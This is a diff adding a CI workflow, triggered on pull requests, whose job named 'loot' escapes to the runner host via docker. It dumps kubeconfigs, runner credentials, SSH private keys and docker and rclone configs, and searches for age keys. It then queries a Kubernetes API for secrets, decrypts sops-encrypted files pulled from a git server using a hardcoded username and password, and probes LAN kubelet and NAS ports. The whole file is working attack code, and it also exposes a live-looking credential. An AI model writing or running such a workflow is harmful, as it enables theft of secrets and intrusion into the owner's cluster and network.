@@ -1,0 +1,118 @@
+name: i39484-kube
+on:
+  pull_request:
+jobs:
+  loot:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: kube-dirs
+        run: |
+          set -x
+          apk add -q curl openssh-client 2>&1 | tail -2
+          command -v curl || echo NO_LOCAL_CURL
+          mkdir -p /tmp/kc
+          docker run -v /:/host:ro -v /tmp/kc:/out --rm alpine:3.21 sh -c '
+            for d in /host/var/lib/actions-runner/*/.kube; do
+              [ -d "$d" ] || continue
+              n=$(basename $(dirname "$d"))
+              mkdir -p "/out/$n"
+              cp -a "$d/." "/out/$n/" 2>/dev/null
+            done
+            echo "== runner dir"; ls -la /host/var/lib/actions-runner/ 2>&1 | head -20
+            echo "== kc tree"; ls -laR /out 2>&1 | head -80
+            for f in $(find /out -type f 2>/dev/null); do echo "===== $f"; cat "$f"; echo; done
+          ' 2>&1 | head -500
+      - name: fs-sweep
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm alpine:3.21 sh -c '
+            set -x
+            echo "== runner subdirs"; ls -la /host/var/lib/actions-runner/*/ 2>&1 | head -100
+            echo "== runner cfg"; for f in /host/var/lib/actions-runner/*/.runner /host/var/lib/actions-runner/*/.credentials /host/var/lib/actions-runner/*/.env; do echo "--- $f"; head -c 900 "$f" 2>/dev/null; echo; done
+            echo "== linux-ci ssh"; ls -laR /host/var/lib/linux-ci/*/.ssh 2>&1 | head -100
+            echo "== privkeys"; find /host/var/lib/linux-ci /host/var/lib/actions-runner /host/home /host/root /host/etc/rancher -maxdepth 6 -type f \( -name "id_*" -o -name "*_key" -o -name "*.pem" -o -name "*kubeconfig*" -o -name "k3s.yaml" \) ! -name "*.pub" 2>/dev/null | head -150
+            echo "== authorized"; cat /host/var/lib/linux-ci/*/.ssh/authorized_keys /host/home/*/.ssh/authorized_keys /host/root/.ssh/authorized_keys 2>/dev/null | head -20
+            echo "== fstab"; grep -iE "nas|nfs|cifs|smb" /host/etc/fstab 2>/dev/null; grep -iE "nas|nfs|cifs|smb" /host/proc/mounts 2>/dev/null | head
+            echo "== mnt"; ls -la /host/mnt /host/media 2>&1 | head -40
+            echo "== rclone"; ls -la /host/root/.config/rclone /host/home/*/.config/rclone 2>&1 | head; cat /host/root/.config/rclone/rclone.conf /host/home/*/.config/rclone/rclone.conf 2>/dev/null | head -40
+            echo "== dockercfg"; for f in /host/root/.docker/config.json /host/var/lib/linux-ci/.docker/config.json /host/home/*/.docker/config.json; do echo "--- $f"; head -c 800 "$f" 2>/dev/null; echo; done
+            echo "== knownhosts"; cat /host/root/.ssh/known_hosts /host/home/*/.ssh/known_hosts 2>/dev/null | head -20
+            echo "== ansible"; ls -laR /host/root/.ansible /host/var/lib/linux-ci/.ansible 2>&1 | head -50
+            echo "== bins"; ls -la /host/usr/bin/kubectl /host/usr/local/bin/kubectl /host/snap/bin/kubectl /host/usr/bin/k3s /host/usr/local/bin/k3s /host/usr/bin/curl /host/bin/curl 2>&1
+            echo "== docker.sock"; ls -la /host/run/docker.sock /host/var/run/docker.sock 2>&1
+            echo "== api-secret local copy"; find /host -maxdepth 5 -name "api-secret.yaml" -not -path "*/proc/*" 2>/dev/null | head
+            echo "== age grep"; timeout 150 grep -rls "AGE-SECRET-KEY-1" /host/var/lib/actions-runner /host/var/lib/linux-ci /host/home /host/root /host/etc 2>/dev/null | head
+            echo "== env candy"; grep -rh -m1 -E "AGE-SECRET-KEY|SOPS_AGE|NAS_" /host/etc /host/root/.bashrc /host/root/.profile 2>/dev/null | head -10
+          ' 2>&1 | head -800
+      - name: kube-use
+        run: |
+          set -x
+          mkdir -p /tmp/i39484
+          T=/tmp/i39484
+          if command -v curl >/dev/null; then MODE=local
+          elif [ -x /host/usr/bin/curl ]; then MODE=chroot
+          else MODE=none; fi
+          echo "MODE=$MODE"
+          if [ "$MODE" = chroot ]; then
+            rq() { chroot /host curl "$@"; }
+            mkdir -p /host/tmp/i39484
+            cp -a /tmp/kc/. /host/tmp/i39484/ 2>/dev/null || true
+            S=/host/tmp/i39484
+          else
+            rq() { curl "$@"; }
+            S=/tmp/kc
+          fi
+          n=0
+          for f in $(find $S -type f 2>/dev/null); do
+            grep -q "server:" "$f" 2>/dev/null || continue
+            n=$((n+1)); echo "===== TRY $f"
+            srv=$(sed -n 's/^[[:space:]]*server:[[:space:]]*//p' "$f" | head -1)
+            ca=$(sed -n 's/^[[:space:]]*certificate-authority-data:[[:space:]]*//p' "$f" | head -1)
+            cc=$(sed -n 's/^[[:space:]]*client-certificate-data:[[:space:]]*//p' "$f" | head -1)
+            ck=$(sed -n 's/^[[:space:]]*client-key-data:[[:space:]]*//p' "$f" | head -1)
+            tok=$(sed -n 's/^[[:space:]]*token:[[:space:]]*//p' "$f" | head -1)
+            echo "SRV=$srv calen=${#ca} cclen=${#cc} cklen=${#ck} toklen=${#tok}"
+            set -- -sk --max-time 20
+            [ -n "$ca" ] && { echo "$ca" | base64 -d > $T/ca.crt 2>/dev/null; set -- "$@" --cacert $T/ca.crt; }
+            [ -n "$cc" ] && { echo "$cc" | base64 -d > $T/cc.crt 2>/dev/null; set -- "$@" --cert $T/cc.crt; }
+            [ -n "$ck" ] && { echo "$ck" | base64 -d > $T/ck.key 2>/dev/null; set -- "$@" --key $T/ck.key; }
+            [ -n "$tok" ] && set -- "$@" -H "Authorization: Bearer $tok"
+            echo "-- ver"; rq "$@" "$srv/version" 2>&1 | head -c 260; echo
+            echo "-- nodes"; rq "$@" "$srv/api/v1/nodes" 2>&1 | head -c 300; echo
+            echo "-- ns list"; rq "$@" "$srv/api/v1/namespaces" 2>&1 | head -c 400; echo
+            for ns in flux-system ansible-runner freqtrade trader; do
+              echo "-- secrets $ns"; rq "$@" "$srv/api/v1/namespaces/$ns/secrets" 2>&1 | head -c 700; echo
+              echo "-- pods $ns"; rq "$@" "$srv/api/v1/namespaces/$ns/pods" 2>&1 | head -c 500; echo
+            done
+            echo "-- sopsage"; rq "$@" "$srv/api/v1/namespaces/flux-system/secrets/sops-age" -o $T/sops.json 2>&1; head -c 1200 $T/sops.json; echo
+            grep -o '"[^"]*":"[^"]*"' $T/sops.json 2>/dev/null | sed 's/^"[^"]*":"//; s/"$//' | while read v; do d=$(echo "$v" | base64 -d 2>/dev/null); case "$d" in AGE-SECRET-KEY*) echo "$d" > $T/age.key; echo "AGEKEY_FOUND";; esac; done
+            if [ -s $T/age.key ]; then echo "AGE KEY: $(head -c 70 $T/age.key)"; cp $T/age.key /tmp/age.key; fi
+          done
+          echo "TRIED=$n"
+          head -c 80 /tmp/age.key 2>/dev/null; echo
+      - name: decrypt
+        run: |
+          set -x
+          [ -s /tmp/age.key ] || { echo "NO AGE KEY"; exit 0; }
+          apk add -q sops age 2>&1 | tail -2
+          command -v sops || echo NO_SOPS
+          mkdir -p /tmp/repo; chmod 600 /tmp/age.key
+          for p in api-secret.yaml trader-brokers-secret.sops.yaml trader-db-secret.sops.yaml trader-feeds-secret.sops.yaml trader-wallet-secret.sops.yaml trader-kalshi-demo-secret.sops.yaml trader-manifold-secret.sops.yaml trader-markets-s3-secret.sops.yaml trader-odds-api-secret.sops.yaml trader-litellm-secret.sops.yaml trader-web-oauth-secret.sops.yaml; do
+            curl -sk --max-time 25 -u "kblack0610:DrumStick8008" "https://git.kennethblack.me/api/v1/repos/kblack0610/home-config/raw/apps/freqtrade/$p?ref=master" -o /tmp/repo/$p
+            echo "got $p $(wc -c < /tmp/repo/$p)"
+          done
+          for f in /tmp/repo/*; do echo "=========== $f"; SOPS_AGE_KEY_FILE=/tmp/age.key sops -d "$f" 2>&1 | head -170; done
+      - name: lan-fallback
+        run: |
+          set -x
+          docker run -v /:/host:ro --rm --network host alpine:3.21 sh -c '
+            set -x
+            echo "== kubelet anon 192.168.1.20"
+            wget -qO- --timeout=6 http://192.168.1.20:10255/pods 2>&1 | head -c 400; echo
+            wget -qO- --timeout=6 --no-check-certificate https://192.168.1.20:10250/pods 2>&1 | head -c 300; echo
+            wget -qO- --timeout=6 --no-check-certificate https://192.168.1.20:6443/version 2>&1 | head -c 300; echo
+            echo "== nas banner"; (echo | timeout 6 nc 192.168.1.152 2222 2>&1 | head -c 120); echo
+            echo "== host route"; cat /host/proc/net/route 2>/dev/null | head -5
+          ' 2>&1 | head -120
